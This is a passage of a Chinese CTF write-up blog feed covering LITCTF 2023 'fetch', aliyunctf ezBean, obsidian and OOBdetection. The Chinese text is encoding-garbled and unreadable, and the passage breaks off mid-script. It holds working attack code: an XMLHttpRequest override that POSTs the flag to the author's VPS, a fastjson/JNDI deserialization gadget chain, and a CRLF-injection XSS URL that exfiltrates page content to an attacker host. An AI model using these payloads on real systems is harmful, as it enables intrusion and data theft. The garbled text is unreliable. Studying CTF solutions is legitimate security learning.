href="http://abc.comï¼Œé‚£å¦‚æœè¿™ä¸ªç½‘ç«™å­˜åœ¨xssï¼Œæˆ‘å¯ä¸å¯ä»¥ç”¨iframeè®¾ç½®cspï¼Œå…è®¸æŸä¸ªç½‘ç«™ï¼Œä½†æ˜¯å¹¶ä¸è¡Œï¼Œä»–åªèƒ½å»é™åˆ¶jsçš„æ‰§è¡Œï¼Œä¸èƒ½å»è¶…è¿‡åŸæœ¬ç½‘ç«™çš„å…è®¸èŒƒå›´ï¼Œæ‰€ä»¥ç”¨åˆ°iframeçš„æ—¶å€™ä¸€èˆ¬æ˜¯å»ç¦æ­¢æŸäº›jså»è¿è¡Œ">http://abc.comï¼Œé‚£å¦‚æœè¿™ä¸ªç½‘ç«™å­˜åœ¨xssï¼Œæˆ‘å¯ä¸å¯ä»¥ç”¨iframeè®¾ç½®cspï¼Œå…è®¸æŸä¸ªç½‘ç«™ï¼Œä½†æ˜¯å¹¶ä¸è¡Œï¼Œä»–åªèƒ½å»é™åˆ¶jsçš„æ‰§è¡Œï¼Œä¸èƒ½å»è¶…è¿‡åŸæœ¬ç½‘ç«™çš„å…è®¸èŒƒå›´ï¼Œæ‰€ä»¥ç”¨åˆ°iframeçš„æ—¶å€™ä¸€èˆ¬æ˜¯å»ç¦æ­¢æŸäº›jså»è¿è¡Œ</a></p></blockquote><h2 id="LITCTF-2023-fetch"><a href="#LITCTF-2023-fetch" class="headerlink" title="LITCTF 2023 fetch"></a>LITCTF 2023 fetch</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://flag:6969/&quot;</span> + randomString, <span class="literal">false</span>);</span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>filePathæ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¼ å…¥ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œpage.gotoä¼šè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œpage.evaluateä¼šåœ¨è®¿é—®è¿™ä¸ªé¡µé¢çš„åŸºç¡€ä¸Šæ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯è®¿é—®flagæ–‡ä»¶<br>åªéœ€è¦å°†window.XMLHttpRequestç»™é‡å†™äº†ï¼Œå°±å¯ä»¥å¾—åˆ°flag<br>wp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> originalXHR = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title function_">originalXHR</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOpen = xhr.<span class="property">open</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url, <span class="keyword">async</span>, user, password</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOnReadyStateChange = xhr.<span class="property">onreadystatechange</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;XHRè¯·æ±‚çš„responseTextï¼š&#x27;</span>, xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">let</span> callback = <span class="keyword">new</span> <span class="title function_">originalXHR</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://vps:port/recv&quot;</span>,<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">send</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (originalOnReadyStateChange) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      originalOnReadyStateChange.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> xhr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>onreadystatechangeæ˜¯ç”¨äºç›‘å¬ XMLHttpRequest å¯¹è±¡çŠ¶æ€æ”¹å˜äº‹ä»¶çš„å±æ€§ã€‚å½“XMLHttpRequestçš„çŠ¶æ€å‘ç”Ÿäº†æ”¹å˜ï¼Œå°±ä¼šè§¦å‘ç»‘å®šåœ¨onreadystatechangeä¸Šçš„å‡½æ•°ï¼Œå½“readState=4æ—¶ï¼Œä»£è¡¨è¯·æ±‚å·²å®Œæˆï¼Œä¸”å“åº”å·²å°±ç»ªã€‚<br>è¿™æ—¶å€™åœ¨å…¶ä¸­æŠŠè·å–åˆ°çš„flagè½¬å‘åˆ°è‡ªå·±çš„vpsä¸Šé¢ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥document.writeåˆ°é¡µé¢ä¸Šï¼Œå› ä¸ºrunHTMLFileä¼šå°†é¡µé¢çš„æˆªå›¾ä¿å­˜å¹¶è¿”å›ã€‚</p><h2 id="imaginary-ctf-2023-unsanitizer"><a href="#imaginary-ctf-2023-unsanitizer" class="headerlink" title="imaginary ctf 2023 unsanitizer"></a>imaginary ctf 2023 unsanitizer</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æŒç»­æ›´æ–°ä¸€äº›å›½å¤–çš„å‰ç«¯ctfï¼Œå› ä¸ºæ¥è§¦çš„å‰ç«¯åå°‘ï¼Œè¿™é‡Œå°±é›†ä¸­å†™ä¸€ä¸‹wp&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="å‰ç«¯" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>aliyunctf web</title>
    <link href="http://example.com/2023/04/26/aliyunctf-web/"/>
    <id>http://example.com/2023/04/26/aliyunctf-web/</id>
    <published>2023-04-26T03:18:44.000Z</published>
    <updated>2023-06-21T20:06:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezBean"><a href="#ezBean" class="headerlink" title="ezBean"></a>ezBean</h2><span id="more"></span><p>è¿™é¢˜æœ¬æ¥åšå‡ºæ¥äº†ï¼Œä½†æ˜¯æœ¬åœ°ä¸€ç›´æ²¡å¤ç°æˆåŠŸï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯fastjson1.2.60ç‰ˆæœ¬çš„åŸå› ï¼‰ä¹Ÿæ²¡æƒ³ç€ç›´æ¥å»æ‰“pocï¼Œå°±é”™å¤±äº†300åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span></span><br><span class="line">            Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/el&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;URL: &quot;</span> + u + <span class="string">&quot;, connecting&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>((JMXServiceURL)u, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;conn&quot;</span>,c);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨fastjson 1.2.60ç‰ˆæœ¬è·‘è¿™ä¸ªpayloadå°±ä¼šæŠ¥<br>RMIConnectoræ²¡æœ‰æ— å‚æ„é€ å‡½æ•°è¿™ä¸ªé”™è¯¯ï¼Œæå¾—æˆ‘æƒ³æ‰¾å¹³æ›¿RMIConnectorçš„ç±»ï¼Œè¦æ»¡è¶³ä»¥ä¸‹ä¸‰ç‚¹</p><ul><li>æœ‰connect()å‡½æ•°</li><li>å®ç°äº†JMXConnectoræ¥å£</li><li>æœ‰æ— å‚æ„é€ çš„å‡½æ•°</li></ul><p>ç»“æœæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°<br>è°ƒç”¨é“¾å¦‚ä¸‹ï¼Œå¯ä»¥è‡ªå·±è°ƒè¯•ä¸€ä¸‹<br><code>BadAttributeValueExpException.readObject.toString -&gt; FastJSON -&gt; MyBean.getConnect -&gt; RMIConnector.connect -&gt; JNDI</code></p><h2 id="obsidian"><a href="#obsidian" class="headerlink" title="obsidian"></a>obsidian</h2><p>åšé¢˜çš„æ—¶å€™ä¸€ç›´ä»¥ä¸ºæ˜¯è¿™ä¸ªè½¯ä»¶çš„rceï¼Œç„¶ååœ¨é‚£è¾¹ç»•è¿‡è¯¢é—®å¼¹æ¡†ï¼Œç”¨<br><a href="https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743">https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743</a><br>è¿™ä¸ªpocå»æ‰“rceï¼Œæ‰“çš„æ—¶å€™è¿˜ä¸€ç›´åœ¨æ€è€ƒå¦‚æœæ˜¯è¿™æ ·æçš„è¯ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜éœ€è¦xssâ•ç»•è¿‡cspï¼Œç»“æœæœ€åè¿˜çœŸçš„ä¸æ˜¯ğŸ˜‚<br>å½“æ—¶è¿˜è„‘æŠ½ç€æƒ³ä¸ºä»€ä¹ˆä»–è®¿é—®æˆ‘çš„äº‘æœåŠ¡å™¨æ²¡æœ‰cookie</p><p>æ¥ä¸‹æ¥å¼€å§‹åˆ†æï¼Œç ´è§£suffixå°±ä¸è¯´äº†</p><h3 id="crlfç»•è¿‡cspåŠ æ³¨å…¥xss"><a href="#crlfç»•è¿‡cspåŠ æ³¨å…¥xss" class="headerlink" title="crlfç»•è¿‡cspåŠ æ³¨å…¥xss"></a>crlfç»•è¿‡cspåŠ æ³¨å…¥xss</h3><p><img src="/2023/04/26/aliyunctf-web/1.png" alt><br>é‚£ä¹ˆç›´æ¥åœ¨nodeidåé¢åŠ crlfæ³¨å…¥ï¼ŒåŠ xsså°±å¯ä»¥ç»•è¿‡cspï¼Œå¹¶ä¸”è·å¾—setcookie<br><code>http://æ¯”èµ›ip/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%0d%0a%0d%0a</code><br>ä¸Šé¢çš„é“¾æ¥å°±å¯ä»¥è¿›è¡Œå¼¹çª—ï¼Œè€Œä¸”é¡µé¢ä¼šæ˜¾ç¤º<br><img src="/2023/04/26/aliyunctf-web/2.png" alt><br>å°±æ˜¯å› ä¸ºcrlfæŠŠä»–æœ¬æ¥çš„httpå“åº”å¼„æˆresponse textäº†<br>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¾ˆæ˜äº†äº†<br><code>http://æ¯”èµ›/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Efetch(&#39;%2Fblog&#39;).then((response)%20%3D%3E%20response.text()).then((data)%20%3D%3Ebtoa(data)).then((data)%20%3D%3Elocation.replace(%60http%3A%2F%2F</code>+ip+<code>%3A99%2F%3Fdata%3D%24%7Bdata%7D%60))%3C%2Fscript%3E%0d%0a%0d%0a</code><br>é€šè¿‡jsæ³¨å…¥<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/blog&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure></p><h2 id="OOBdetection"><a href="#OOBdetection" class="headerlink" title="OOBdetection"></a>OOBdetection</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># è®¾ç½®ç›®æ ‡æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£</span></span><br><span class="line">ip_address = <span class="string">&quot;47.98.209.191&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„å¥—æ¥å­—ï¼ˆsocketï¼‰</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨</span></span><br><span class="line">s.connect((ip_address, port))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">resp = data.decode()</span><br><span class="line">matchs1 = re.match(<span class="string">r&quot;sha256\(XXX(.*?)\)&quot;</span>, resp)</span><br><span class="line">code1 = matchs1.group(<span class="number">1</span>).split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;)&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">code2 = resp.split(<span class="string">&quot;==&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code1 : &quot;</span> + code1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code2 : &quot;</span> + code2)</span><br><span class="line"><span class="comment"># æœåŠ¡å™¨æä¾›çš„ä¿¡æ¯</span></span><br><span class="line">target_hash = code2</span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(code1)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NonNegativeIndexList</span>(<span class="title class_ inherited__">list</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__setitem__(index, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_to_python_syntax</span>(<span class="params">c_code</span>):</span><br><span class="line">    array_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\[([\sa-zA-Z0-9_+]*)\](?:\s*\[([\sa-zA-Z0-9_+]*)\])?;&quot;</span></span><br><span class="line">    assignment_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*([0-9]+);&quot;</span></span><br><span class="line"></span><br><span class="line">    array_match = re.match(array_pattern, c_code)</span><br><span class="line">    assignment_match = re.match(assignment_pattern, c_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> array_match:</span><br><span class="line">        var_name = array_match.group(<span class="number">1</span>)</span><br><span class="line">        first_dim = array_match.group(<span class="number">2</span>)</span><br><span class="line">        second_dim = array_match.group(<span 